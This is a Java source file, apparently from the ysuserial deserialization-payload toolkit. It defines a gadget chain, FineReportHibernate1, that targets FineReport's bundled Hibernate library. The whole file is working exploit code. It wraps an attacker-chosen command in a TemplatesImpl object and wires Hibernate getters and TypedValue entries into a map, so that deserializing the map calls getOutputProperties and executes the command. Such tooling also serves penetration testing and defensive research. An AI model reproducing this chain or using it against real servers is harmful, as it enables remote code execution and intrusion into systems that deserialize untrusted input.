package org.su18.ysuserial.payloads;

import com.fr.third.org.hibernate.engine.spi.TypedValue;
import com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer;
import com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer;
import com.fr.third.org.hibernate.type.AbstractType;
import com.fr.third.org.hibernate.type.ComponentType;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * @author su18
 */
public class FineReportHibernate1 implements ObjectPayload<Object>, DynamicDependencies {

	public Object getObject(String command) throws Exception {
		Object tpl     = Gadgets.createTemplatesImpl(command);
		Object getters = makeHibernate5Getter(tpl.getClass(), "getOutputProperties");
		return makeHibernate45Caller(tpl, getters);
	}

	static Object makeHibernate45Caller(Object tpl, Object getters) throws Exception {

		PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
		Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

		ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
		Reflections.setFieldValue(t, "componentTuplizer", tup);
		Reflections.setFieldValue(t, "propertySpan", 1);
		Reflections.setFieldValue(t, "propertyTypes", new com.fr.third.org.hibernate.type.Type[]{
				t
		});

		TypedValue v1 = new TypedValue(t, null);
		Reflections.setFieldValue(v1, "value", tpl);
		Reflections.setFieldValue(v1, "type", t);

		TypedValue v2 = new TypedValue(t, null);
		Reflections.setFieldValue(v2, "value", tpl);
		Reflections.setFieldValue(v2, "type", t);

		return Gadgets.makeMap(v1, v2);
	}


	public static Object makeHibernate5Getter(Class<?> tplClass, String method) throws NoSuchMethodException, SecurityException,
			ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
		Class<?>       getterIf    = Class.forName("com.fr.third.org.hibernate.property.access.spi.Getter");
		Class<?>       basicGetter = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
		Constructor<?> bgCon       = basicGetter.getConstructor(Class.class, String.class, Method.class);
		Object         g           = bgCon.newInstance(tplClass, "test", tplClass.getDeclaredMethod(method));
		Object         arr         = Array.newInstance(getterIf, 1);
		Array.set(arr, 0, g);
		return arr;
	}
}